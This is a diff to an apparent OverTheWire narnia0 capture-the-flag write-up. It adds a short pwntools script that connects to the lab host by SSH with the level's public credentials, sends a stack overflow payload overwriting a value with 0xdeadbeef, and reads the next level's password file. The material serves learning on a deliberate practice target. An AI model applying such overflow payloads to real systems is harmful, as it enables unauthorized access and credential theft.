@@ -215,3 +215,15 @@ cat /etc/narnia_pass/narnia1
 ```
 
 There we go. Finally got it. On to narnia1.
+
+As a followup, I wanted to work my way back through these challenges implementing the solutions with the [pwntools](http://pwntools.com) python module in an effort to sharpen my python skills and learn how to utilize this module for future CTF fun.  Below is my solution:
+
+```python
+from pwn import *
+
+s = ssh(user='narnia0', host='narnia.labs.overthewire.org', password='narnia0')
+sh = s.run('/narnia/narnia0')
+sh.sendline('A'*20 + p32(0xdeadbeef))
+sh.sendline('cat /etc/narnia_pass/narnia1')
+log.info('Flag: '+sh.recvline().split('\n')[0])
+```
